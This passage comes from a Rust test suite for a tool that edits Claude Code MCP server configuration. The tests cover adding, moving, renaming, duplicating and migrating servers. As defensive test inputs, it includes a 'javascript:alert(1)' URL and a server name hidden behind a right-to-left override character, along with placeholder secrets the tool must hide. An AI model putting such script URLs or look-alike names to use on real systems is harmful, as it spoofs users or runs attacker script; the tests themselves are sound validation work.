        *lock(&env.chosen) = Some(file.clone());
        core.choose_export_file("servers.json".into(), None);
        assert_eq!(
            chosen(&core),
            crate::export_file::FileChoice::Chosen(file.clone())
        );
        core.send(Command::SaveExport {
            path: file.clone(),
            text: "{}".into(),
            replace: false,
        });
        assert_eq!(saved(&core), (file.to_string_lossy().into_owned(), Ok(())));
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "{}\n");
        core.send(Command::SaveExport {
            path: file.clone(),
            text: "{\"again\": 1}".into(),
            replace: false,
        });
        assert_eq!(saved(&core).1, Err(crate::export_file::SaveError::Exists));
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "{}\n");

        let claude_json = env.dir.path().join("cfg").join(".claude.json");
        let before = std::fs::read(&claude_json).unwrap();
        core.send(Command::SaveExport {
            path: claude_json.clone(),
            text: "{}".into(),
            replace: true,
        });
        assert!(matches!(
            saved(&core).1,
            Err(crate::export_file::SaveError::Refused(_))
        ));
        assert_eq!(std::fs::read(&claude_json).unwrap(), before);
    }

    #[test]
    fn a_project_server_is_shown_but_not_editable() {
        let (env, key, _repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let (json, editable) = entry_of(&core, project_id(&key, "ps"));
        assert!(!editable);
        assert!(json.unwrap().contains("server.js"));
        let refused = plan_failure(
            &core,
            vec![Change::Delete {
                id: project_id(&key, "ps"),
            }],
        );
        assert!(refused.contains("repository"), "{refused}");
        let refused = plan_failure(
            &core,
            vec![Change::Replace {
                id: project_id(&key, "ps"),
                json: "{\"command\": \"x\"}".into(),
            }],
        );
        assert!(refused.contains("repository"), "{refused}");
    }

    #[test]
    fn deleting_a_user_server_removes_it_and_only_it() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(&core, vec![Change::Delete { id: user_id("gw") }]);
        assert!(
            plan.files[0].lines.contains(&"- gw".to_owned()),
            "{:?}",
            plan.files
        );
        assert!(plan.warnings.iter().any(|w| w.contains("sign-in")));
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. }))
        );
        let now = config_json(&env);
        assert_eq!(now["mcpServers"], serde_json::json!({}));
        assert_eq!(now["projects"], two_projects("end")["projects"]);
        assert!(
            snapshots(&events)
                .last()
                .unwrap()
                .servers
                .iter()
                .all(|r| r.name != "gw")
        );
        verify_passes(&core);
    }

    fn duplicate(id: ServerId, name: &str, targets: Vec<Target>) -> Change {
        Change::Duplicate {
            id,
            name: name.to_owned(),
            targets,
        }
    }

    #[test]
    fn duplicating_a_user_server_into_projects_copies_it_secrets_and_all() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![duplicate(
                user_id("gw"),
                "gw_copy",
                vec![
                    Target::Local("/work/a".into()),
                    Target::Local("/work/b".into()),
                ],
            )],
        );
        assert_eq!(plan.summary, ["Duplicate gw as gw_copy in a and b"]);
        assert_eq!(plan.action, "Duplicate");
        assert!(!plan.destructive);
        let shown = format!("{plan:?}");
        assert!(!shown.contains("s3cret-value"), "{shown}");
        assert!(shown.contains("+ gw_copy"), "{shown}");
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. }))
        );
        let now = config_json(&env);
        let gw = two_projects("end")["mcpServers"]["gw"].clone();
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["gw_copy"], gw);
        assert_eq!(now["projects"]["/work/b"]["mcpServers"]["gw_copy"], gw);
        assert_eq!(now["mcpServers"], two_projects("end")["mcpServers"]);
        let rows = &snapshots(&events).last().unwrap().servers;
        assert_eq!(rows.iter().filter(|r| r.name == "gw_copy").count(), 2);
        verify_passes(&core);
    }

    #[test]
    fn duplicating_a_local_server_to_the_user_and_its_own_project() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![duplicate(
                local_id("loc", "/work/a"),
                "loc2",
                vec![Target::User, Target::Local("/work/a".into())],
            )],
        );
        assert_eq!(
            plan.summary,
            ["Duplicate loc as loc2 for the user and in a"]
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let loc = serde_json::json!({"type": "stdio", "command": "x"});
        assert_eq!(now["mcpServers"]["loc2"], loc);
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["loc2"], loc);
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["loc"], loc);
    }

    #[test]
    fn moving_a_server_does_not_warn_about_itself() {
        // Found trying Move in the real app: moving plain from the user to a project warned that in that project
        // it "is used instead of the user server plain", the very server being moved.
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("gw"),
                to: Target::Local("/work/b".into()),
            }],
        );
        assert_eq!(plan.summary, ["Move gw to b"]);
        assert!(
            !plan.warnings.iter().any(|w| w.contains("used instead")),
            "{:?}",
            plan.warnings
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let gw = two_projects("end")["mcpServers"]["gw"].clone();
        assert_eq!(now["projects"]["/work/b"]["mcpServers"]["gw"], gw);
        assert!(now["mcpServers"].get("gw").is_none(), "{now}");
        assert_eq!(now["tail"], "end");
        verify_passes(&core);
        // The nearby variant: from a project to the user.
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: local_id("loc", "/work/a"),
                to: Target::User,
            }],
        );
        assert!(plan.warnings.is_empty(), "{:?}", plan.warnings);
        assert!(
            plan.notes.iter().any(|n| n.contains("on in every project")),
            "{:?}",
            plan.notes
        );
    }

    #[test]
    fn moving_still_warns_about_another_server_of_that_name() {
        let mut config = two_projects("end");
        config["projects"]["/work/b"]["mcpServers"] =
            serde_json::json!({"loc": {"type": "stdio", "command": "y"}});
        let env = quiet_env(&config);
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: local_id("loc", "/work/a"),
                to: Target::User,
            }],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("In b") && w.contains("local")),
            "{:?}",
            plan.warnings
        );
    }

    #[test]
    fn a_copy_under_a_name_used_elsewhere_warns_which_one_claude_uses() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        // A user server called loc: in /work/a the local loc wins.
        let plan = plan_for(
            &core,
            vec![duplicate(
                local_id("loc", "/work/a"),
                "loc",
                vec![Target::User],
            )],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("local") && w.contains("a")),
            "{:?}",
            plan.warnings
        );
    }

    fn add(name: &str, json: &str, targets: Vec<Target>) -> Change {
        Change::Add {
            name: name.to_owned(),
            json: json.to_owned(),
            targets,
            secret: None,
        }
    }

    const PASTED_FS: &str = r#"{"type": "stdio", "command": "npx", "args": ["-y", "@x/fs", "/tmp"], "env": {"API_KEY": "pasted-secret", "HOME_DIR": "${HOME}", "MIXED": "sk-live-123${SUFFIX}", "DEFAULTED": "${TOK:-ghp_realsecret}"}}"#;

    #[test]
    fn adding_a_server_writes_it_where_asked_and_shows_everything_it_runs() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![add(
                "fs",
                PASTED_FS,
                vec![Target::User, Target::Local("/work/b".into())],
            )],
        );
        assert_eq!(plan.summary, ["Add fs for the user and in b"]);
        assert_eq!(plan.action, "Add");
        assert!(!plan.destructive);
        let review = &plan.reviews[0];
        assert!(review.title.contains("fs"), "{review:?}");
        for line in [
            "Command: npx",
            "Argument 1: -y",
            "Argument 2: @x/fs",
            "Argument 3: /tmp",
        ] {
            assert!(review.lines.iter().any(|l| l == line), "{line}: {review:?}");
        }
        // The variables it reads are named; what was typed in is not shown anywhere, even next to a reference.
        for name in ["HOME", "SUFFIX", "TOK"] {
            assert!(
                review
                    .lines
                    .iter()
                    .any(|l| l.contains(&format!("variable {name}"))),
                "{name}: {review:?}"
            );
        }
        assert!(
            review
                .lines
                .iter()
                .any(|l| l == "Environment: HOME_DIR=${HOME}"),
            "{review:?}"
        );
        let shown = format!("{plan:?}");
        for secret in ["pasted-secret", "sk-live-123", "ghp_realsecret"] {
            assert!(!shown.contains(secret), "{secret}: {shown}");
        }
        assert!(
            plan.notes.iter().any(|n| n.contains("starts its command")),
            "{:?}",
            plan.notes
        );
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. }))
        );
        let now = config_json(&env);
        let written: serde_json::Value = serde_json::from_str(PASTED_FS).unwrap();
        assert_eq!(now["mcpServers"]["fs"], written);
        assert_eq!(now["projects"]["/work/b"]["mcpServers"]["fs"], written);
        // In the order pasted.
        let text =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        let at = |s: &str| text.find(s).unwrap();
        assert!(at("\"npx\"") < at("\"args\"") && at("\"args\"") < at("\"API_KEY\""));
        // Nothing else moved.
        assert_eq!(
            now["mcpServers"]["gw"],
            two_projects("end")["mcpServers"]["gw"]
        );
        assert_eq!(
            now["projects"]["/work/a"],
            two_projects("end")["projects"]["/work/a"]
        );
        let rows = &snapshots(&events).last().unwrap().servers;
        assert_eq!(rows.iter().filter(|r| r.name == "fs").count(), 2);
        verify_passes(&core);
    }

    #[test]
    fn several_servers_can_be_added_to_one_place_in_one_plan() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![
                add(
                    "one",
                    r#"{"command": "a"}"#,
                    vec![Target::Local("/work/a".into())],
                ),
                add(
                    "two",
                    r#"{"type": "http", "url": "https://two.example/mcp", "headers": {"Authorization": "Bearer pasted-token"}}"#,
                    vec![Target::Local("/work/a".into())],
                ),
            ],
        );
        assert_eq!(plan.summary, ["Add one in a", "Add two in a"]);
        assert_eq!(plan.reviews.len(), 2);
        assert!(
            plan.reviews[1]
                .lines
                .iter()
                .any(|l| l == "Connects to: https://two.example/mcp"),
            "{:?}",
            plan.reviews
        );
        assert!(!format!("{plan:?}").contains("pasted-token"));
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let servers = &now["projects"]["/work/a"]["mcpServers"];
        assert_eq!(servers["one"], serde_json::json!({"command": "a"}));
        assert_eq!(
            servers["two"]["headers"]["Authorization"],
            "Bearer pasted-token"
        );
        assert_eq!(
            servers["loc"],
            two_projects("end")["projects"]["/work/a"]["mcpServers"]["loc"]
        );
        verify_passes(&core);
    }

    #[test]
    fn what_cannot_be_added_is_refused_saying_why() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let a = || vec![Target::Local("/work/a".into())];
        for (changes, why) in [
            (vec![add("bad name", r#"{"command": "x"}"#, a())], "name"),
            (vec![add("loc", r#"{"command": "x"}"#, a())], "already"),
            (
                vec![add("gw", r#"{"command": "x"}"#, vec![Target::User])],
                "already",
            ),
            (
                vec![
                    add("twice", r#"{"command": "x"}"#, a()),
                    add("twice", r#"{"command": "y"}"#, a()),
                ],
                "twice",
            ),
            (
                vec![add(
                    "n",
                    r#"{"command": "x"}"#,
                    vec![Target::Local("/elsewhere".into())],
                )],
                "not a project",
            ),
            (
                vec![add("n", r#"{"command": "x"}"#, vec![])],
                "Choose where",
            ),
            (vec![add("n", "{not json", a())], "JSON"),
            // OAuth is for remote servers: Claude Code would drop it here without a word.
            (
                vec![add(
                    "n",
                    r#"{"command": "x", "oauth": {"clientId": "c"}}"#,
                    a(),
                )],
                "OAuth",
            ),
            (
                vec![add(
                    "n",
                    r#"{"type": "http", "url": "javascript:alert(1)"}"#,
                    a(),
                )],
                "url",
            ),
            (vec![add("n", r#"{"command": "x\u202ey"}"#, a())], "safely"),
        ] {
            let refused = plan_failure(&core, changes.clone());
            assert!(refused.contains(why), "{changes:?}: {refused}");
        }
        assert_eq!(config_json(&env), two_projects("end"));
    }

    #[test]
    fn a_server_added_under_a_name_used_elsewhere_warns_which_one_claude_uses() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![add("loc", r#"{"command": "x"}"#, vec![Target::User])],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("local") && w.contains("instead of this server")),
            "{:?}",
            plan.warnings
        );
    }

    /// Two projects, with a local server in /work/a and a user server that both start a script by a relative path.
    fn relative_projects() -> serde_json::Value {
        let mut config = two_projects("end");
        config["mcpServers"]["rel"] =
            serde_json::json!({"command": "node", "args": ["build/index.js"]});
        config["projects"]["/work/a"]["mcpServers"]["here"] =
            serde_json::json!({"command": "python", "args": ["server.py"]});
        config
    }

    fn relative_warnings(plan: &PlanView) -> Vec<&String> {
        plan.warnings
            .iter()
            .filter(|w| w.contains("each session's folder"))
            .collect()
    }

    #[test]
    fn a_server_added_for_the_user_with_a_relative_path_is_warned_about_and_a_local_one_is_not() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let json = r#"{"command": "node", "args": ["build/index.js"], "env": {"CFG": "./c.json"}}"#;
        let plan = plan_for(&core, vec![add("rel", json, vec![Target::User])]);
        let [warning] = relative_warnings(&plan)[..] else {
            panic!("{:?}", plan.warnings)
        };
        assert!(
            warning.starts_with("rel: use full paths.")
                && warning.contains("can't find build/index.js or ./c.json (in CFG)."),
            "{warning}"
        );
        let plan = plan_for(
            &core,
            vec![add("rel", json, vec![Target::Local("/work/b".into())])],
        );
        assert!(relative_warnings(&plan).is_empty(), "{:?}", plan.warnings);
        let plan = plan_for(
            &core,
            vec![add(
                "abs",
                r#"{"command": "node", "args": ["/opt/x/index.js"]}"#,
                vec![Target::User],
            )],
        );
        assert!(relative_warnings(&plan).is_empty(), "{:?}", plan.warnings);
    }

    #[test]
    fn a_local_server_moved_or_duplicated_to_the_user_with_a_relative_path_is_warned_about() {
        let env = quiet_env(&relative_projects());
        let core = env.start();
        for change in [
            Change::Move {
                id: local_id("here", "/work/a"),
                to: Target::User,
            },
            duplicate(local_id("here", "/work/a"), "here2", vec![Target::User]),
        ] {
            let plan = plan_for(&core, vec![change]);
            let [warning] = relative_warnings(&plan)[..] else {
                panic!("{:?}", plan.warnings)
            };
            assert!(warning.contains("server.py"), "{warning}");
        }
        // Into another project it is as it was: the session starts in that project's folder.
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: local_id("here", "/work/a"),
                to: Target::Local("/work/b".into()),
            }],
        );
        assert!(relative_warnings(&plan).is_empty(), "{:?}", plan.warnings);
    }

    #[test]
    fn saving_a_user_server_says_so_while_it_still_has_a_relative_path_and_not_once_fixed() {
        let env = quiet_env(&relative_projects());
        let core = env.start();
        let save = |json: &str| Change::Replace {
            id: user_id("rel"),
            json: json.to_owned(),
        };
        let plan = plan_for(
            &core,
            vec![save(
                r#"{"command": "node", "args": ["build/index.js", "--verbose"]}"#,
            )],
        );
        assert_eq!(relative_warnings(&plan).len(), 1, "{:?}", plan.warnings);
        let plan = plan_for(
            &core,
            vec![save(
                r#"{"command": "node", "args": ["/srv/rel/build/index.js"]}"#,
            )],
        );
        assert!(relative_warnings(&plan).is_empty(), "{:?}", plan.warnings);
        // Turning it off writes no definition, so it is no moment to bring this up.
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("rel"),
                enabled: false,
            }],
        );
        assert!(relative_warnings(&plan).is_empty(), "{:?}", plan.warnings);
    }

    #[test]
    fn a_point_raised_by_two_changes_apart_is_said_once() {
        // Variant of the migration's repeated note: two deletes with another change between them.
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![
                Change::Delete {
                    id: local_id("loc", "/work/a"),
                },
                // Warns that a user server is switched per project.
                Change::SetEnabled {
                    id: user_id("gw"),
                    enabled: false,
                },
                Change::Delete { id: user_id("gw") },
            ],
        );
        let deleting = plan
            .warnings
            .iter()
            .filter(|w| w.starts_with("Deleting"))
            .count();
        assert_eq!(deleting, 1, "{:?}", plan.warnings);
    }

    fn migrate(project: &str) -> Change {
        Change::MigrateLegacyDisabled {
            project: project.to_owned(),
        }
    }

    /// /work/a has an old switch-off list naming the user server gw, its local loc and a name already off.
    fn legacy_config() -> serde_json::Value {
        serde_json::json!({
            "numStartups": 3,
            "mcpServers": {"gw": {"type": "stdio", "command": "node", "env": {"TOKEN": "s3cret-value"}}},
            "projects": {
                "/work/a": {
                    "mcpServers": {"loc": {"type": "stdio", "command": "x"}},
                    "mcpServersDisabled": ["gw", "loc", "old"],
                    "disabledMcpServers": ["old"],
                    "allowedTools": []
                },
                "/work/b": {"mcpServersDisabled": ["gw"]},
                "/work/c": {"mcpServersDisabled": [1]}
            }
        })
    }

    #[test]
    fn migrating_the_old_list_switches_its_servers_off_and_removes_it() {
        let env = quiet_env(&legacy_config());
        let core = env.start();
        let plan = plan_for(&core, vec![migrate("/work/a"), migrate("/work/b")]);
        assert_eq!(
            plan.summary,
            [
                "Turn off gw and loc in a, as the old switch-off list says",
                "Turn off gw in b, as the old switch-off list says"
            ]
        );
        assert_eq!(plan.action, "Migrate");
        assert!(!plan.destructive);
        assert!(!plan.nothing_to_do);
        // Said once, however many lists move (it was said once per list).
        let ignored: Vec<&String> = plan.notes.iter().filter(|n| n.contains("ignore")).collect();
        assert_eq!(ignored.len(), 1, "{:?}", plan.notes);
        let shown = format!("{plan:?}");
        assert!(!shown.contains("s3cret-value"), "{shown}");
        let events = apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let was = legacy_config();
        assert_eq!(
            now["projects"]["/work/a"],
            serde_json::json!({
                "mcpServers": {"loc": {"type": "stdio", "command": "x"}},
                "disabledMcpServers": ["old", "gw", "loc"],
                "allowedTools": []
            })
        );
        assert_eq!(
            now["projects"]["/work/b"],
            serde_json::json!({"disabledMcpServers": ["gw"]})
        );
        assert_eq!(now["projects"]["/work/c"], was["projects"]["/work/c"]);
        assert_eq!(now["mcpServers"], was["mcpServers"]);
        let snap = *snapshots(&events).last().unwrap();
        let left: Vec<&str> = snap
            .legacy_disabled
            .iter()
            .map(|l| l.project.as_str())
            .collect();
        assert_eq!(left, ["/work/c"]);
        let loc = snap.servers.iter().find(|r| r.name == "loc").unwrap();
        assert!(!loc.enabled);
        let gw = snap.servers.iter().find(|r| r.name == "gw").unwrap();
        assert_eq!(gw.disabled_in, 2);
        verify_passes(&core);
    }

    #[test]
    fn migrating_a_list_whose_servers_are_already_off_only_removes_it() {
        let mut config = legacy_config();
        config["projects"]["/work/b"]["disabledMcpServers"] = serde_json::json!(["gw"]);
        let env = quiet_env(&config);
        let core = env.start();
        let plan = plan_for(&core, vec![migrate("/work/b")]);
        assert_eq!(plan.summary, ["Remove the old switch-off list in b"]);
        assert!(!plan.nothing_to_do);
        apply_and_wait(&core, &plan);
        assert_eq!(
            config_json(&env)["projects"]["/work/b"],
            serde_json::json!({"disabledMcpServers": ["gw"]})
        );
    }

    #[test]
    fn a_migration_is_refused_for_a_list_of_the_wrong_shape_or_one_that_is_gone() {
        let env = quiet_env(&legacy_config());
        let core = env.start();
        let why = plan_failure(&core, vec![migrate("/work/c")]);
        assert!(why.contains("other than server names"), "{why}");
        let why = plan_failure(&core, vec![migrate("/work/none")]);
        assert!(why.contains("no old switch-off list"), "{why}");
        // Nothing was written.
        assert_eq!(config_json(&env), legacy_config());
    }

    fn rename(id: ServerId, name: &str) -> Change {
        Change::Rename {
            id,
            name: name.to_owned(),
        }
    }

    /// `Gateway` for the user and `gateway` in /work/a, which differ only in case; both are off where they are used.
    fn casing_config() -> serde_json::Value {
        serde_json::json!({
            "numStartups": 3,
            "mcpServers": {
                "Gateway": {"type": "stdio", "command": "node", "env": {"TOKEN": "s3cret-value"}},
                "plain": {"type": "stdio", "command": "p"}
            },
            "projects": {
                "/work/a": {
                    "mcpServers": {"gateway": {"type": "stdio", "command": "x", "env": {"KEY": "other-secret"}}},
                    "disabledMcpServers": ["gateway", "zz"]
                },
                "/work/b": {"disabledMcpServers": ["Gateway", "other"]}
            }
        })
    }

    #[test]
    fn renaming_a_local_server_changes_its_spelling_and_keeps_it_off() {
        let env = quiet_env(&casing_config());
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![rename(local_id("gateway", "/work/a"), "Gateway")],
        );
        assert_eq!(plan.summary, ["Rename gateway to Gateway in a"]);
        assert_eq!(plan.action, "Rename");
        assert!(!plan.destructive);
        let shown = format!("{plan:?}");
        assert!(!shown.contains("other-secret"), "{shown}");
        let events = apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let was = casing_config();
        let servers = &now["projects"]["/work/a"]["mcpServers"];
        assert_eq!(
            servers["Gateway"],
            was["projects"]["/work/a"]["mcpServers"]["gateway"]
        );
        assert!(servers.get("gateway").is_none(), "{servers}");
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["Gateway", "zz"])
        );
        // Nothing else moved: the user's servers and the other project.
        assert_eq!(now["mcpServers"], was["mcpServers"]);
        assert_eq!(now["projects"]["/work/b"], was["projects"]["/work/b"]);
        let rows = &snapshots(&events).last().unwrap().servers;
        assert!(rows.iter().all(|r| !r.casing_collision), "{rows:?}");
        verify_passes(&core);
    }

    #[test]
    fn renaming_a_user_server_keeps_it_off_in_every_project_that_had_it_off() {
        let env = quiet_env(&casing_config());
        let core = env.start();
        let plan = plan_for(&core, vec![rename(user_id("Gateway"), "gateway")]);
        assert_eq!(plan.summary, ["Rename Gateway to gateway (user server)"]);
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let was = casing_config();
        assert_eq!(now["mcpServers"]["gateway"], was["mcpServers"]["Gateway"]);
        assert!(now["mcpServers"].get("Gateway").is_none());
        assert_eq!(now["mcpServers"]["plain"], was["mcpServers"]["plain"]);
        assert_eq!(
            now["projects"]["/work/b"]["disabledMcpServers"],
            serde_json::json!(["gateway", "other"])
        );
        // The local server of the same spelling keeps its own entry in /work/a.
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["gateway", "zz"])
        );
        verify_passes(&core);
    }

    #[test]
    fn two_renames_make_one_plan_and_fix_the_collision() {
        let env = quiet_env(&casing_config());
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![
                rename(local_id("gateway", "/work/a"), "gateway2"),
                rename(user_id("Gateway"), "gateway1"),
            ],
        );
        assert_eq!(plan.action, "Rename");
        let events = apply_and_wait(&core, &plan);
        let rows = &snapshots(&events).last().unwrap().servers;
        let names: Vec<&str> = rows.iter().map(|r| r.name.as_str()).collect();
        assert!(
            names.contains(&"gateway1") && names.contains(&"gateway2"),
            "{names:?}"
        );
        assert!(rows.iter().all(|r| !r.casing_collision));
        verify_passes(&core);
    }

    #[test]
    fn a_rename_that_cannot_be_made_says_why() {
        let env = quiet_env(&casing_config());
        let core = env.start();
        for (change, why) in [
            (rename(user_id("Gateway"), "Gateway"), "already"),
            (rename(user_id("Gateway"), "plain"), "already"),
            (rename(local_id("gateway", "/work/a"), "gateway"), "already"),
            (rename(user_id("Gateway"), "bad name"), "name"),
            (rename(user_id("Gateway"), "-x"), "name"),
            (rename(user_id("ghost"), "ok"), "no longer"),
        ] {
            let refused = plan_failure(&core, vec![change.clone()]);
            assert!(refused.contains(why), "{change:?}: {refused}");
        }
        assert_eq!(config_json(&env), casing_config());
    }

    #[test]
    fn a_project_server_is_not_renamed() {
        let (env, key, _repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let refused = plan_failure(&core, vec![rename(project_id(&key, "ps"), "ps2")]);
        assert!(refused.contains("repository"), "{refused}");
    }

    #[test]
    fn a_server_that_signs_in_with_oauth_is_not_renamed() {
        let mut config = casing_config();
        config["mcpServers"]["Gateway"] = serde_json::json!({
            "type": "http", "url": "https://example.com/mcp",
            "oauth": {"clientId": "abc"}
        });
        let env = quiet_env(&config);
        let core = env.start();
        let refused = plan_failure(&core, vec![rename(user_id("Gateway"), "gateway1")]);
        assert!(refused.contains("OAuth"), "{refused}");
        assert_eq!(config_json(&env), config);
    }

    #[test]
    fn duplicates_that_cannot_be_made_say_why() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        for (change, why) in [
            (
                duplicate(user_id("gw"), "gw", vec![Target::User]),
                "already",
            ),
            (
                duplicate(user_id("gw"), "loc", vec![Target::Local("/work/a".into())]),
                "already",
            ),
            (
                duplicate(user_id("gw"), "bad name", vec![Target::User]),
                "name",
            ),
            (duplicate(user_id("gw"), "-x", vec![Target::User]), "name"),
            (duplicate(user_id("gw"), "ok", vec![]), "where"),
            (
                duplicate(
                    user_id("gw"),
                    "ok",
                    vec![Target::Local("/elsewhere".into())],
                ),
                "project",
            ),
            (
                duplicate(user_id("ghost"), "ok", vec![Target::User]),
                "no longer",
            ),
        ] {
            let refused = plan_failure(&core, vec![change.clone()]);
            assert!(refused.contains(why), "{change:?}: {refused}");
        }
        assert_eq!(config_json(&env), two_projects("end"));
    }

    #[test]
    fn a_project_server_is_not_duplicated_yet() {
        let (env, key, _repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let refused = plan_failure(
            &core,
            vec![duplicate(project_id(&key, "ps"), "ps2", vec![Target::User])],
        );
        assert!(refused.contains(".mcp.json"), "{refused}");
    }

    // ---- writes use the keys as the file spells them, not the cleaned text shown

    /// "ab", and a different server whose name hides a right-to-left override and so shows as "ab" too; and one
    /// whose name is cut for display.
    fn lookalike_env() -> (Env, String, String) {
        let hidden = "a\u{202e}b".to_owned();
        let long = format!("srv-{}", "x".repeat(600));
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"ab": {"command": "x"}, hidden.clone(): {"command": "y"}, long.clone(): {"command": "z"}},
            "projects": {"/work/a": {"disabledMcpServers": []}}
        }));
        (env, hidden, long)
    }

    /// The row whose connection is `name` as written in the file.
    fn row_on_disk(core: &Core, name: &str) -> ServerRow {
        let id = crate::model::ConnectionId::new(Scope::User, None, name);
        let events = collect(core, |e| !snapshots(e).is_empty());
        snapshots(&events)
            .last()
            .unwrap()
            .servers
            .iter()
            .find(|r| r.connection == id)
            .cloned()
            .expect("the row")
    }

    #[test]
    fn switching_off_a_server_writes_its_own_name_not_the_one_shown() {
        // Found reviewing #1 (open item): ops took the cleaned, cut name shown on the row. Turning off the hidden
        // look-alike wrote "ab" and switched off the other server, reporting success.
        let (env, hidden, long) = lookalike_env();
        let core = env.start();
        let lookalike = row_on_disk(&core, &hidden);
        assert_eq!(lookalike.name, "ab", "shown cleaned");
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: lookalike.id(),
                enabled: false,
            }],
        );
        apply_and_wait(&core, &plan);
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!([hidden]));
        // The variant: a name cut for display is written whole. One engine at a time on the file.
        drop(core);
        let core = env.start();
        let cut = row_on_disk(&core, &long);
        assert!(cut.name.ends_with('…'));
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: cut.id(),
                enabled: false,
            }],
        );
        apply_and_wait(&core, &plan);
        assert_eq!(
            disabled_list(&env, "/work/a"),
            serde_json::json!([hidden, long])
        );
    }

    #[test]
    fn deleting_and_editing_reach_the_server_whatever_its_name_shows() {
        let (env, hidden, long) = lookalike_env();
        let core = env.start();
        let events = collect(&core, |e| !snapshots(e).is_empty());
        let rows = &snapshots(&events).last().unwrap().servers;
        let pick = |name: &str| {
            let id = crate::model::ConnectionId::new(Scope::User, None, name);
            rows.iter().find(|r| r.connection == id).cloned().unwrap()
        };
        let (cut, lookalike) = (pick(&long), pick(&hidden));
        // Shown as JSON under the name in the file, not "no longer in the configuration".
        let (json, _) = entry_of(&core, cut.id());
        assert!(json.unwrap().contains("\"z\""));
        let plan = plan_for(&core, vec![Change::Delete { id: cut.id() }]);
        apply_and_wait(&core, &plan);
        let plan = plan_for(
            &core,
            vec![Change::Replace {
                id: lookalike.id(),
                json: "{\n  \"command\": \"y2\"\n}".into(),
            }],
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        assert_eq!(
            now["mcpServers"][&hidden],
            serde_json::json!({"command": "y2"})
        );
        assert_eq!(
            now["mcpServers"]["ab"],
            serde_json::json!({"command": "x"}),
            "the other one untouched"
        );
        assert!(now["mcpServers"].get(&long).is_none());
    }

    /// The last status, other than Checking, reported for the connection `id`.
    fn status_by_connection(
        events: &[Event],
        id: &crate::model::ConnectionId,
    ) -> Option<(Status, Option<String>)> {
        events.iter().rev().find_map(|e| match e {
            Event::Status {
                id: got,
                status,
                detail,
                ..
            } if got.connection == *id && *status != Status::Checking => {
                Some((*status, detail.clone()))
            }
            _ => None,
        })
    }

    #[test]
    fn a_server_is_checked_under_its_own_name_never_a_look_alikes() {
        // Review of the fix: checks still passed the shown name to `claude mcp get`, so the look-alike was shown
        // with the real "ab"'s result.
        let hidden = "a\u{202e}b";
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"ab": {"type": "stdio", "command": "x"}}}),
            r#"{"rules":[
                {"args":["--version"],"stdout_file":"version.txt"},
                {"args":["mcp","get","ab"],"stdout_file":"connected.txt"}]}"#,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("connected.txt", CONNECTED),
            ],
        );
        let core = env.start();
        let ab = crate::model::ConnectionId::new(Scope::User, None, "ab");
        let lookalike = crate::model::ConnectionId::new(Scope::User, None, hidden);
        collect(&core, |e| status_by_connection(e, &ab).is_some());
        // The look-alike appears from outside: it is new (not the "ab" already there), so it is checked, and its
        // name cannot be passed to claude, so it is reported unchecked rather than given "ab"'s answer.
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {
                "ab": {"type": "stdio", "command": "x"},
                hidden: {"type": "stdio", "command": "y"}}}),
        );
        let events = collect(&core, |e| status_by_connection(e, &lookalike).is_some());
        let (status, detail) = status_by_connection(&events, &lookalike).unwrap();
        assert_ne!(status, Status::Connected);
        assert!(detail.unwrap_or_default().contains("not checked"));
        assert_eq!(
